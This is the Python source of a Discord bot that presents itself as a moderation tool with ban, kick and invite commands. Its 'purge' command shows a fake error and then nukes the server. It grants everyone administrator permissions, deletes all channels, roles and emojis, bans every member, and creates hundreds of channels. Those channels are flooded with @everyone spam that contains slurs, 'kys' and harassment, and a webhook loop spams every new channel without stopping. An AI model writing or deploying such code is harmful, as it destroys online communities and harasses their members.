import asyncio
import random
import discord
import time
import colorama
import rich
import logging

from discord.ext import commands
from discord import Permissions
from colorama import Fore
from threading import Thread
from flask import Flask
from rich import print

# CONFIG:
token = "ur token there"
CHANNELSNAME = ["TπT Runs This Server Now", "nuked-by-TπT", "你已被轰炸了", "中华人民共和国万岁!", "Gachas Are Scared", "TπT Nuker On Top!", "TπT Runs You", "TπT Owns You", "nuked by TπT no gacha", "get fucked by TπT", "哈哈你的服务器死了", "给我去死", "glory to the party", "haha ur server die",]
SPAMMSG = ["@everyone 你已被轰炸了，笨蛋","@everyone 去中国吧！！！","@everyone 中华人民共和国万岁！！！","@everyone NUKED BY TπT","@everyone No more gachas!!!", "@everyone Child Groomers Must Die!!!","@everyone Fuck Retarded Child Groomers","@everyone Yo Bitch you got fucked!!!","@everyone WHY SO ASS :sob:", "@everyone Gachas Go Die!", "@everyone TπT Owns You", "@everyone", "@everyone OWNED BY TπT","@everyone Jet and Infamy is a dogass","@everyone All of you are kid","@everyone Mods are too weak",]
ROLENAMES = ["omg TπT go run","Nuked By TπT","TπT Owns You","Why So Ass sob","die gachas","Should Have Palled Me"]
WEBGOON = ["TπT","ggS EZ", "Infamy go kys", "GaG server tags are kids", "WHY SO ASS :sob:", "NUKED BY TπT", "中华人民共和国万岁！！！", "你被轰炸了", ]
amount = 500  # CHANGE THAT FUCKING AMOUNT

Intentional = discord.Intents.all()
Intentional.message_content = True
Intentional.guilds = True
Intentional.members = True

Botprefix = "?"
xlient = commands.Bot(command_prefix=commands.when_mentioned_or(Botprefix), intents=Intentional)

# NO LOGS
logging.getLogger("discord").setLevel(logging.CRITICAL)
logging.getLogger("discord.client").setLevel(logging.CRITICAL)
logging.getLogger("discord.gateway").setLevel(logging.CRITICAL)

# KEEP ONLINE:
app = Flask('')

@app.route('/')
def home():
  return "BOT IS STILL FUCKING HERE BRUH"

def run():
    app.run(host="0.0.0.0", port=8080)

def keep_alive():
    alivethen = Thread(target=run)
    alivethen.start()

# ON STARTUP:
@xlient.event
async def on_server_join(server):
  print(f"Joining {server.name}...")

@xlient.event
async def on_ready():
  await xlient.change_presence(activity=discord.Game(name="YEEEEEEEEET"))  #change it if you can

print(r"""
[#20F0DF] ██████████████                                                             [/#20F0DF]
[#40E5BF] ██████████████                                                             [/#40E5BF]
[#60DA9F]      ████▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓  ███    ██ ██    ██ ██   ██ ███████ ██████  [/#60DA9F]
[#80CF7F]      ████▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓  ████   ██ ██    ██ ██  ██  ██      ██   ██ [/#80CF7F]
[#A0C45F]      ████    ▒▒▒▒    ▓▓▓▓▓      ██ ██  ██ ██    ██ █████   █████   ██████  [/#A0C45F]
[#C0B93F]      ████    ▒▒▒▒    ▓▓▓▓▓      ██  ██ ██ ██    ██ ██  ██  ██      ██   ██ [/#C0B93F]
[#E0AE1F]      ████    ▒▒▒▒    ▓▓▓▓▓      ██   ████  ██████  ██   ██ ███████ ██   ██ [/#E0AE1F]
[#FD9A00]      ████▒▒▒▒▒▒▒▒    ▓▓▓▓▓                                                 [/#FD9A00]
[#FB9200]      ████▒▒▒▒▒▒▒▒    ▓▓▓▓▓                                                 [/#FB9200]
""")

# COMMANDS:
# FAKE PING
@xlient.command()
async def ping(ctx):
  await ctx.send(f'Pong! {round(xlient.latency * 1000)}ms')

# INVITES
@xlient.command()
async def invite(ctx):
    totalInvites = 0
    for i in await ctx.guild.invites():
        if i.inviter == ctx.author:
            totalInvites += i.uses
    embed = discord.Embed(title='Invite count', description='', color=0x00fdff)
    embed.add_field(name="You have invited:", value=f"{totalInvites} members", inline=False)
    await ctx.send(embed=embed)

# PALL MALL
@xlient.event
async def on_command_error(ctx, error):
  if isinstance(error, commands.MissingPermissions):
      embed = discord.Embed(title='Error', description='', color=0xff0000)
      embed.add_field(name=":octagonal_sign: I don't have permissions to do this yet, please check my role permissions", value="", inline=False)
      await ctx.send(embed=embed)
  elif isinstance(error, commands.MissingRequiredArgument):
    embed = discord.Embed(title='Error', description='', color=0xff0000)
    if ctx.command.name == 'ban':
        embed.add_field(name=":octagonal_sign: You have to type in the command like this:", value="ban [member] [reason]", inline=False)
    elif ctx.command.name == 'kick':
        embed.add_field(name=":octagonal_sign: You have to type in the command like this:", value="kick [member] [reason]", inline=False)
    else:
        embed.add_field(name=":octagonal_sign: Missing required argument(s) for this command.", value="", inline=False)
    await ctx.send(embed=embed)

@xlient.command()
@commands.has_permissions(ban_members = True)
async def ban(ctx, member : discord.Member, *, reason = None):
    await member.ban(reason = reason)
    embed = discord.Embed(title='Success', description='', color=0x00ff1e)
    embed.add_field(name=f":white_check_mark: {member.mention} was banned.", value="", inline=False)
    await ctx.send(embed=embed)

@xlient.command()
@commands.has_permissions(administrator = True)
async def unban(ctx, *, member):
    banned_users = await ctx.guild.bans()
    member_name, member_discriminator = member.split("#")

    for ban_entry in banned_users:
        user = ban_entry.user

        if (user.name, user.discriminator) == (member_name, member_discriminator):
            await ctx.guild.unban(user)
            embed = discord.Embed(title='Success', description='', color=0x00ff1e)
            embed.add_field(name=f":white_check_mark: {member.mention} was unbanned.", value="", inline=False)
            await ctx.send(embed=embed)
            return

@xlient.command()
@commands.has_permissions(kick_members = True)
async def kick(ctx, member : discord.Member, *, reason = None):
    await member.kick(reason = reason)
    embed = discord.Embed(title='Success', description='', color=0x00ff1e)
    embed.add_field(name=f":white_check_mark: {member.mention} was kicked.", value="Tip: If the member joins back, use the ban command instead.", inline=False)
    await ctx.send(embed=embed)

#STOP
@xlient.command()
@commands.is_owner()
async def stop(ctx):
    await ctx.bot.close()

# FUCK THE SERVER WITH NUKEEEEEEE!!!!!!!!!
@xlient.command()
async def purge(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title='Purge command', description='', color=0x00fdff)
    embed.add_field(name=":diamond_shape_with_a_dot_inside: Starting purge...", value="", inline=False)
    await ctx.send(embed=embed)
    time.sleep(2)
    embed = discord.Embed(title='Error', description='', color=0xff0000)
    embed.add_field(name=":octagonal_sign: Purge not executed.", value="", inline=False)
    await ctx.send(embed=embed)

    guild = ctx.guild

    await ctx.guild.edit(name="PROPERTY OF TπT")  # change it if you can
    try:
        role = discord.utils.get(guild.roles, name="@everyone")
        await role.edit(permissions=Permissions.all())
        print(Fore.LIGHTGREEN_EX + "ENJOY THE CHAOS" + Fore.RESET), {e}
    except:
        print(Fore.LIGHTRED_EX + "No admin bruh" + Fore.RESET)
        
    for channel in list(guild.channels):
        try:
            await channel.delete()
            print(f"Deleted {channel.name}")
        except (discord.HTTPException, discord.Forbidden) as e:
            print(f"Failed to delete {channel.name}: {e}")

    for channel in list(guild.channels):
        try:
            await channel.delete()
            print(Fore.LIGHTGREEN_EX + f"Deleted {channel.name}")
            await asyncio.sleep(0.2)
        except (discord.HTTPException, discord.Forbidden) as e:
            print(Fore.LIGHTGREEN_EX + f"Failed to delete {channel.name}: {e}")

    for i in range(amount):
        try:
            await ctx.guild.create_text_channel(random.choice(CHANNELSNAME))
            print(Fore.LIGHTGREEN_EX + f"Created channel: {i}", Fore.RESET)
            await asyncio.sleep(0.2)
        except (discord.HTTPException, discord.Forbidden, discord.NotFound) as e:
            print(Fore.LIGHTRED_EX + "Error creating channel.", Fore.RESET, {e})

    for i in range(amount):
        for channel in guild.channels:
           try:
               await channel.send(random.choice(SPAMMSG))
               print(Fore.LIGHTGREEN_EX + f"{channel.name} PING PONG!", Fore.RESET)
               await asyncio.sleep(0.1)
           except (discord.HTTPException, discord.Forbidden, discord.NotFound,) as e:
               print(Fore.LIGHTRED_EX + f"PING---PANG!{channel.name}", Fore.RESET, {e})

    for role in guild.roles:
        try:
            await role.delete()
            print(Fore.LIGHTGREEN_EX + f"{role.name} deleted", Fore.RESET)
            await asyncio.sleep(0.1)
        except (discord.HTTPException, discord.Forbidden, discord.NotFound) as e:
            print(Fore.LIGHTRED_EX + f"{role.name} has not been deleted", Fore.RESET, {e})

    for i in range(amount):
        try:
            await guild.create_role(name=ROLENAMES-{i+1})
            print(Fore.LIGHTGREEN_EX + f"Role creation success!", Fore.RESET)
            await asyncio.sleep(0.2)
        except (discord.HTTPException, discord.Forbidden, discord.NotFound) as e:
            print(Fore.LIGHTRED_EX + f"ROLE_CREATION_ERROR", Fore.RESET, {e})

    for emoji in list(guild.emojis):
        try:
            await emoji.delete()
            print(Fore.LIGHTGREEN_EX + f"EMOTIONAL DAMAGE {emoji.name} In {ctx.guild.name}!", Fore.RESET,)
            await asyncio.sleep(0.2)
        except (discord.HTTPException, discord.Forbidden, discord.NotFound) as e:
            print(Fore.LIGHTRED_EX + f"UNABLE TO EMO {emoji.name} In {ctx.guild.name}!", Fore.RESET, {e})

    for member in ctx.guild.members:
      for user in list(ctx.guild.members):
        try:
          await ctx.guild.ban(user)
          print(Fore.LIGHTGREEN_EX + f"GET PALLED {member.name}!" + Fore.RESET)
        except (discord.HTTPException, discord.Forbidden, discord.NotFound) as e:
          print(Fore.LIGHTRED_EX + f"Ban Hammer broke on {member.name}." + Fore.RESET, {e})

    for channel in guild.text_channels:
        link = await channel.create_invite(max_age=0, max_uses=0)
        print(f"New Invite: {link}")

    print("Mission Complete: Server has been nuked successfully!")
    return

async def start_bot():
    try:
        await xlient.start(token)
    except discord.errors.LoginFailure:
        print("The token you typed in doesn't exist anymore.")
    except discord.errors.ConnectionClosed as e:
        print(f"Connection closed: {e}")
    except Exception as e:
        print(f"An error occurred while starting the bot: {e}")

@xlient.event
async def on_guild_channel_create(channel):
    global webhook
    webhook = await channel.create_webhook(name=random.choice(WEBGOON))
    while True:
        await channel.send(random.choice(SPAMMSG))
        await webhook.send(random.choice(SPAMMSG), username=random.choice(WEBGOON))
try:
    loop = asyncio.get_running_loop()
except RuntimeError:
    print("There's no loop found, starting bot as usual.")
    xlient.run(token)
else:
    print("A loop was found, starting bot...")
    loop.create_task(start_bot())
